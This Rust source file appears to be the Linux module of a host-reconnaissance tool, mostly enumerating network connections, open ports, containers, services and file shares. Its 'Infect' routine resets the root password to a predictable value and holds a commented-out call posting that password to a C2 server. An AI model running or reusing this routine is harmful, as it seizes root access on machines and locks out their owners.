use pnet::datalink;
use procfs::net::{route, unix, TcpNetEntry, TcpState, UdpNetEntry, UdpState};
use procfs::process::FDTarget;
use procfs::process::Stat;
use serde_json::json;
use serde_json::Map;
use serde_json::Value;
use std;
use std::collections::HashMap;
use std::fs;
use std::io::Write;
use std::path::Path;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::thread;
use sysinfo::UserExt;

// Converts UdpState to ConnectionState
impl From<&UdpState> for super::types::ConnectionState {
    fn from(udp_state: &UdpState) -> Self {
        match udp_state {
            UdpState::Established => super::types::ConnectionState::Established,
            UdpState::Close => super::types::ConnectionState::Closed,
        }
    }
}

impl From<&TcpState> for super::types::ConnectionState {
    fn from(tcp_state: &TcpState) -> Self {
        match tcp_state {
            TcpState::Established => super::types::ConnectionState::Established,
            TcpState::SynSent => super::types::ConnectionState::SynSent,
            TcpState::SynRecv => super::types::ConnectionState::SynRecv,
            TcpState::FinWait1 => super::types::ConnectionState::FinWait1,
            TcpState::FinWait2 => super::types::ConnectionState::FinWait2,
            TcpState::TimeWait => super::types::ConnectionState::TimeWait,
            TcpState::Close => super::types::ConnectionState::Closed,
            TcpState::CloseWait => super::types::ConnectionState::CloseWait,
            TcpState::LastAck => super::types::ConnectionState::LastAck,
            TcpState::Listen => super::types::ConnectionState::Listen,
            TcpState::Closing => super::types::ConnectionState::Closing,
            _ => super::types::ConnectionState::Unknown,
        }
    }
}

fn change_password(username: &str, password: &str) -> std::io::Result<()> {
    match super::utils::CommandExecutor::execute_command(
        "passwd",
        Some(&[username]),
        Some(&[password]),
    ) {
        Ok(_) => Ok(()),
        Err(e) => Err(e),
    }
}

impl super::types::Infect for crate::Host {
    fn init(&self, schema: &str) {
        // Change password based on Schema
        let password = format!(
            "{}{:?}!",
            schema,
            self.ip.split('.').last().unwrap().parse::<u16>().ok()
        );
        let _ = change_password("root", password.as_str());

        // Post Evil fetch results to C2
        // let _ = post_evil_results(&self.c2, &self.ip, &password);
    }
}

// // build up a map between socket inodes and process stat info:
impl super::types::OS for crate::Host {
    fn conn_info() -> (
        Box<[super::types::NetworkConnection]>,
        Box<[super::types::OpenPort]>,
    ) {
        let all_procs = procfs::process::all_processes().unwrap(); // handle errors appropriately
        let mut map: HashMap<u64, Stat> = HashMap::new();
        for p in all_procs {
            match p {
                Ok(process) => {
                    if let (Ok(stat), Ok(fds)) = (process.stat(), process.fd()) {
                        for fd in fds {
                            match fd {
                                Ok(fd) => {
                                    if let FDTarget::Socket(inode) = fd.target {
                                        // handle errors appropriately
                                        map.insert(inode, stat.clone());
                                    }
                                }
                                Err(_) => {}
                            }
                        }
                    }
                }
                Err(_) => {}
            }
        }

        let shared_map = Arc::new(map);

        let tcp_connections = process_network_entries(procfs::net::tcp, Arc::clone(&shared_map));
        let udp_connections = process_network_entries(procfs::net::udp, Arc::clone(&shared_map));
        let tcp6_connections = process_network_entries(procfs::net::tcp6, Arc::clone(&shared_map));
        let udp6_connections = process_network_entries(procfs::net::udp6, shared_map);

        // Combine TCP and UDP connections
        let mut all_connections = Vec::new();
        all_connections.extend(tcp_connections);
        all_connections.extend(udp_connections);
        all_connections.extend(tcp6_connections);
        all_connections.extend(udp6_connections);

        let mut open_ports = Vec::new();

        // Get the open ports
        all_connections
            .iter()
            .filter(|conn| {
                conn.local_address.contains("0.0.0.0")
                    && conn
                        .state
                        .as_ref()
                        .unwrap_or(&super::types::ConnectionState::default())
                        == &super::types::ConnectionState::Listen
            })
            .filter_map(|conn| {
                // Extract the port number and additional data safely
                conn.local_address.split(':').last().and_then(|port_str| {
                    port_str
                        .parse::<u16>()
                        .ok()
                        .map(|port| (port, conn.process.clone(), &conn.state, &conn.protocol))
                })
            })
            .for_each(|(port, pid, state, protocol)| {
                let open_port = super::types::OpenPort {
                    port,
                    protocol: protocol.clone(),
                    process: pid, // Assuming pid is an Option<i32> or similar
                    version: "".into(),
                    state: state.clone(), // Convert state to String if needed
                };
                open_ports.push(open_port);
            });

        (
            all_connections.into_boxed_slice(),
            open_ports.into_boxed_slice(),
        )
    }

    fn firewall_rules() {
        todo!()
    }

    fn ip() -> Box<str> {
        let routes = match route() {
            Ok(r) => r,
            Err(_) => return "0.0.0.0".into(),
        };

        let intface = match routes
            .iter()
            .filter(|r| r.destination.is_unspecified())
            .last()
        {
            Some(route) => route.iface.clone(),
            None => return "0.0.0.0".into(),
        };

        let interfaces = datalink::interfaces();
        let interface = interfaces
            .into_iter()
            .find(|iface| iface.name == intface.to_string());

        match interface {
            Some(iface) => match iface.ips.first() {
                Some(ip) => ip.ip().to_string().into_boxed_str(),
                None => "0.0.0.0".into(),
            },
            None => "0.0.0.0".into(),
        }
    }

    fn containers() -> Box<[super::types::Container]> {
        let mut containers = Vec::new();

        if which::which("docker").is_ok() {
            containers.extend(get_generic_containers("docker"));
        }

        if which::which("podman").is_ok() {
            containers.extend(get_generic_containers("podman"));
        }

        // containers.extend(get_podman_containers());
        // if which::which("kubectl").is_ok() {
        //     containers.extend(get_kubectl_pods());
        // }
        containers.into_boxed_slice()
    }

    fn services() -> Box<[super::types::Service]> {
        detect_init_system().parse()
    }

    fn shares() -> Box<[super::types::Share]> {
        let smb_shares = read_samba_shares("/var/lib/samba/usershares");
        let nfs_shares = read_nfs_shares("/etc/exports");

        smb_shares
            .into_iter()
            .chain(nfs_shares.into_iter())
            .collect()
    }
}

fn read_samba_shares(directory: &str) -> Vec<super::types::Share> {
    if let Ok(entries) = fs::read_dir(directory) {
        entries
            .filter_map(|entry| {
                let entry = entry.ok()?;
                let content = fs::read_to_string(entry.path()).ok()?;
                let network_path = extract_path(&content)?;
                Some(super::types::Share {
                    share_type: super::types::ShareType::SMB,
                    network_path: Box::from(network_path),
                })
            })
            .collect()
    } else {
        Vec::new()
    }
}

fn exports_line(line: &str) -> Option<super::types::Share> {
    let parts: Vec<&str> = line.split_whitespace().collect();
    parts.first().map(|&path| super::types::Share {
        share_type: super::types::ShareType::NFS,
        network_path: path.into(),
    })
}

fn read_nfs_shares(filepath: &str) -> Vec<super::types::Share> {
    if let Ok(contents) = fs::read_to_string(filepath) {
        contents
            .lines()
            .filter(|line| !line.trim().is_empty() && !line.trim_start().starts_with('#'))
            .filter_map(exports_line)
            .collect()
    } else {
        Vec::new()
    }
}

fn extract_path(file_content: &str) -> Option<String> {
    file_content
        .lines()
        .find(|line| line.starts_with("path="))
        .map(|line| line[5..].to_string())
}

fn process_network_entries<F, T>(
    fetch_entries: F,
    map: Arc<HashMap<u64, Stat>>,
) -> Vec<super::types::NetworkConnection>
where
    F: Fn() -> Result<Vec<T>, procfs::ProcError> + Send + 'static,
    T: NetworkData + Send + 'static, // Ensure T is Send
{
    // Spawn a thread to process the entries
    let handle = thread::spawn(move || {
        let mut connections = Vec::new();

        // Fetch the entries
        if let Ok(entries) = fetch_entries() {
            // Iterate over the entries
            for entry in entries {
                let state = entry.state(); // Get the state without consuming entry

                // Filter out CLOSE connections
                if !state.is_closed() {
                    let connection = super::types::NetworkConnection {
                        local_address: entry.local_address(),
                        remote_address: Some(entry.remote_address()),
                        state: Some(state),
                        protocol: entry.protocol(),
                        process: map.get(&entry.inode()).map(|stat| super::types::Process {
                            pid: stat.pid as u32,
                            name: stat.comm.clone().into_boxed_str(),
                        }),
                        // .map(|stat| (stat.pid, stat.comm.clone())),
                    };
                    connections.push(connection);
                }
            }
        }
        connections
    });

    handle.join().unwrap() // Join the thread and unwrap the result
}

trait NetworkData {
    fn local_address(&self) -> Box<str>;
    fn remote_address(&self) -> Box<str>;
    fn inode(&self) -> u64;
    fn state(&self) -> super::types::ConnectionState;
    fn protocol(&self) -> Box<str>;
}

impl NetworkData for UdpNetEntry {
    fn local_address(&self) -> Box<str> {
        // Return the local_address from TcpNetEntry
        self.local_address.to_string().into_boxed_str()
    }

    fn remote_address(&self) -> Box<str> {
        // Return the remote_address from TcpNetEntry
        self.remote_address.to_string().into_boxed_str()
    }

    fn inode(&self) -> u64 {
        // Return the inode from TcpNetEntry
        self.inode
    }

    fn state(&self) -> super::types::ConnectionState {
        // Return the state from TcpNetEntry
        super::types::ConnectionState::from(&self.state)
    }

    fn protocol(&self) -> Box<str> {
        "UDP".into()
    }
}

impl NetworkData for TcpNetEntry {
    fn local_address(&self) -> Box<str> {
        // Return the local_address from TcpNetEntry
        self.local_address.to_string().into_boxed_str()
    }

    fn remote_address(&self) -> Box<str> {
        // Return the remote_address from TcpNetEntry
        self.remote_address.to_string().into_boxed_str()
    }

    fn inode(&self) -> u64 {
        // Return the inode from TcpNetEntry
        self.inode
    }

    fn state(&self) -> super::types::ConnectionState {
        // Return the state from TcpNetEntry
        super::types::ConnectionState::from(&self.state)
    }

    fn protocol(&self) -> Box<str> {
        "TCP".into()
    }
}

// fn get_kubectl_pods() -> Vec<Container> {
//     let output = Command::new("kubectl")
//         .args(&["get", "pods", "--all-namespaces", "-o", "json"])
//         .output()
//         .expect("Failed to execute command");

//     let output_str = String::from_utf8_lossy(&output.stdout);
//     let parsed_json: serde_json::Value = serde_json::from_str(&output_str).unwrap();

//     parsed_json["items"]
//         .as_array()
//         .unwrap_or(&vec![])
//         .iter()
//         .map(|pod| Container {
//             name: format!(
//                 "{}/{}",
//                 pod["metadata"]["namespace"], pod["metadata"]["name"]
//             )
//             .into(),
//             status: pod["status"]["phase"].as_str().unwrap_or("").into(),
//             id: "".into(),
//             cmd: "".into(),
//             port_bindings: "".into(),
//         })
//         .collect()
// }

fn get_container_ids(command: &str) -> Vec<String> {
    let output = super::utils::CommandExecutor::execute_command(command, Some(&["ps", "-q"]), None);
    match output {
        Ok(output) => String::from_utf8_lossy(&output.stdout)
            .lines()
            .map(String::from)
            .collect(),
        Err(_) => Vec::new(),
    }
}

fn get_generic_containers(command: &str) -> Vec<super::types::Container> {
    let container_ids = get_container_ids(command);

    container_ids
        .iter()
        .filter_map(|id| {
            let inspect_str = match super::utils::CommandExecutor::execute_command(
                command,
                Some(&["inspect", id]),
                None,
            ) {
                Ok(output) => String::from_utf8_lossy(&output.stdout).into(),
                Err(_) => "".to_string(),
            };
            generic_container(&inspect_str).ok()
        })
        .collect()
}

fn generic_container(inspect_data: &str) -> Result<super::types::Container, serde_json::Error> {
    let json: serde_json::Value = serde_json::from_str(inspect_data)?;

    let container_info = &json[0];

    Ok(super::types::Container {
        name: container_info["Name"].as_str().unwrap_or_default().into(),
        status: container_info["State"]["Status"]
            .as_str()
            .unwrap_or_default()
            .into(),
        id: container_info["Id"].as_str().unwrap_or_default().into(),
        cmd: container_info["Config"]["Cmd"]
            .as_array()
            .unwrap_or(&vec!["".into()])[0]
            .as_str()
            .unwrap_or_default()
            .into(),
        port_bindings: port_from_inspect(&container_info["NetworkSettings"]["Ports"].as_object())
            .into(),
        volumes: volumes_from_inspect(&container_info["Mounts"].as_array()).into(),
        networks: networks_from_inspect(&container_info["NetworkSettings"]["Networks"].as_object()),
    })
}

fn volumes_from_inspect(mounts: &Option<&Vec<Value>>) -> Box<[super::types::ContainerVolume]> {
    mounts.map_or(Box::new([]), |mounts| {
        mounts
            .iter()
            .filter_map(|mount| {
                Some(super::types::ContainerVolume {
                    host_path: mount["Source"].as_str()?.into(),
                    container_path: mount["Destination"].as_str()?.into(),
                    mode: mount["Mode"].as_str()?.into(),
                    name: mount["Name"].as_str()?.into(),
                    rw: mount["RW"].as_bool()?,
                    v_type: mount["Type"].as_str()?.into(),
                })
            })
            .collect::<Box<_>>()
        // .into_boxed_slice()
    })
}

fn networks_from_inspect(
    networks: &Option<&Map<String, Value>>,
) -> Box<[super::types::ContainerNetwork]> {
    // Parse the JSON and extract network information
    networks.map_or(Box::new([]), |networks| {
        networks
            .iter()
            .map(|(name, network_data)| super::types::ContainerNetwork {
                name: name.clone().into_boxed_str(),
                ip: network_data["IPAddress"]
                    .as_str()
                    .unwrap_or_default()
                    .into(),
                gateway: network_data["Gateway"].as_str().unwrap_or_default().into(),
                mac_address: network_data["MacAddress"]
                    .as_str()
                    .unwrap_or_default()
                    .into(),
            })
            .collect::<Box<_>>()
    })
}

fn port_from_inspect(port_map: &Option<&Map<String, Value>>) -> Box<[Box<str>]> {
    port_map.map_or(Box::new([] as [Box<str>; 0]), |ports_map| {
        ports_map
            .iter()
            .flat_map(|(container_port, host_ports)| {
                host_ports
                    .as_array()
                    .map_or(Vec::new(), |host_ports_array| {
                        host_ports_array
                            .iter()
                            .filter_map(|host_port_details| {
                                let host_ip =
                                    host_port_details["HostIp"].as_str().unwrap_or("0.0.0.0");
                                let host_port =
                                    host_port_details["HostPort"].as_str().unwrap_or("");
                                Some(
                                    format!("{}:{}->{}", host_ip, host_port, container_port)
                                        .into_boxed_str(),
                                )
                            })
                            .collect::<Vec<Box<str>>>()
                    })
            })
            .collect::<Box<[Box<str>]>>() // Directly collecting into a Boxed Slice
    })
}

enum InitSystem {
    SYSTEMD,
    UPSTART,
    SYSVINIT,
    OPENRC,
    UNKNOWN,
}

impl InitSystem {
    fn parse(&self) -> Box<[super::types::Service]> {
        match self {
            InitSystem::SYSTEMD => InitSystem::systemd(),
            InitSystem::UPSTART => InitSystem::upstart(),
            InitSystem::SYSVINIT => InitSystem::sysvinit(),
            InitSystem::OPENRC => InitSystem::openrc(),
            InitSystem::UNKNOWN => InitSystem::unknown(),
        }
    }

    // Parses the output of systemctl list-units --type=service
    // and returns a Box[] of Service structs
    fn systemd() -> Box<[super::types::Service]> {
        let output = match super::utils::CommandExecutor::execute_command(
            "systemctl",
            Some(&["list-units", "--type=service", "--no-pager"]),
            None,
        ) {
            Ok(output) => output,
            Err(_) => return Box::new([]),
        };

        let output_str = String::from_utf8_lossy(&output.stdout);

        // Directly use the output, assuming the relevant data starts from the beginning
        let lines: Vec<String> = output_str.lines().map(|s| s.to_string()).collect();
        let num_threads = 4;
        let chunk_size = (lines.len() + num_threads - 1) / num_threads; // Ensuring at least n chunks
        let mut threads = vec![];

        let shared_lines = Arc::new(lines); // Ensures the lines are shared between threads

        // Split the lines into chunks and spawn a thread for each chunk
        for chunk in shared_lines.clone().chunks(chunk_size) {
            // Clone each line in the chunk to ensure thread owns the data
            let chunk_cloned: Vec<String> = chunk.iter().cloned().collect();

            // Spawn a thread to process the chunk
            threads.push(thread::spawn(move || {
                // Parse Service chunk n
                chunk_cloned
                    .into_iter()
                    .filter_map(|line| split_service_line(&line))
                    .filter_map(|line| parse_service_line((&line.0, &line.1)))
                    .collect::<Vec<super::types::Service>>()
            }));
        }

        // Join the threads and collect the results
        threads
            .into_iter()
            .map(|thread| thread.join().unwrap())
            .flatten()
            .collect()
    }

    fn upstart() -> Box<[super::types::Service]> {
        todo!()
    }

    fn sysvinit() -> Box<[super::types::Service]> {
        todo!()
    }

    fn openrc() -> Box<[super::types::Service]> {
        let output = match super::utils::CommandExecutor::execute_command(
            "rc-status",
            Some(&["-a"]),
            None,
        ) {
            Ok(output) => String::from_utf8_lossy(&output.stdout).into_owned(),
            Err(_) => return Box::new([]),
        };

        output
            .lines()
            .filter(|line| !line.contains(':')) // Filter out lines with colons
            .filter_map(|line| {
                // Split the line into service name and status parts
                let (name, status) = line.split_once('[')?;
                let status = status.split_once(']')?.0.trim();
                // Some((name.trim(), status))
                Some(super::types::Service {
                    name: name.trim().into(),
                    state: status.into(),
                    start_mode: None,
                    status: None,
                })
            })
            .collect()
    }

    fn unknown() -> Box<[super::types::Service]> {
        todo!()
    }
}

fn parse_service_line((name_part, status_part): (&str, &str)) -> Option<super::types::Service> {
    // Split the status part further to extract state and status
    let mut status_parts = status_part.split_whitespace();
    let state = status_parts.next()?.to_owned();
    let status_str = status_parts.next()?;

    // Mapping the status string to the ServiceStatus enum
    let status = match status_str {
        "active" => Some(super::types::ServiceStatus::Active),
        "inactive" => Some(super::types::ServiceStatus::Inactive),
        "failed" => Some(super::types::ServiceStatus::Failed),
        _ => Some(super::types::ServiceStatus::Unknown),
    };
    let mode = fetch_service_start_mode(&name_part.trim());

    Some(super::types::Service {
        name: name_part.trim().into(),
        state: state.into(),
        start_mode: mode, // Assuming start mode is not available in the input
        status,
    })
}

fn fetch_service_start_mode(name: &str) -> Option<super::types::ServiceStartType> {
    let output = match super::utils::CommandExecutor::execute_command(
        "systemctl",
        Some(&["is-enabled", name]),
        None,
    ) {
        Ok(output) => String::from_utf8_lossy(&output.stdout).into_owned(),
        Err(_) => return None,
    };

    match output.trim() {
        "enabled" => Some(super::types::ServiceStartType::Enabled),
        _ => Some(super::types::ServiceStartType::Disabled),
    }
}

fn split_service_line(line: &str) -> Option<(String, String)> {
    let status_keywords = ["loaded", "active", "running", "exited", "dead"];
    let mut split_index = None;

    for keyword in status_keywords.iter() {
        if let Some(index) = line.find(keyword) {
            split_index = Some(index);
            break;
        }
    }

    split_index.map(|index| {
        let (first, second) = line.split_at(index);
        (first.to_string(), second.to_string()) // Convert slices to owned Strings
    })
}

fn detect_init_system() -> InitSystem {
    if which::which("systemctl").unwrap_or_default().exists() {
        InitSystem::SYSTEMD
    } else if which::which("open-rc").unwrap_or_default().exists() {
        InitSystem::OPENRC
    } else if which::which("initctl").unwrap_or_default().exists() {
        InitSystem::UPSTART
    } else if which::which("service").unwrap_or_default().exists() {
        InitSystem::SYSVINIT
    } else {
        InitSystem::UNKNOWN
    }
}

impl super::types::UserInfo for sysinfo::User {
    // If compiled for linux
    fn is_admin(&self) -> bool {
        // Check for sudoers group in groups or uid 0 (root)
        self.groups().iter().any(|group| group == "wheel") || self.id().to_string() == "0"
    }

    fn is_local(&self) -> bool {
        true
    }

    // Reads from etc password and matches shell to the user
    fn shell(&self) -> Box<str> {
        todo!()
        // self.shell().into()
    }
}
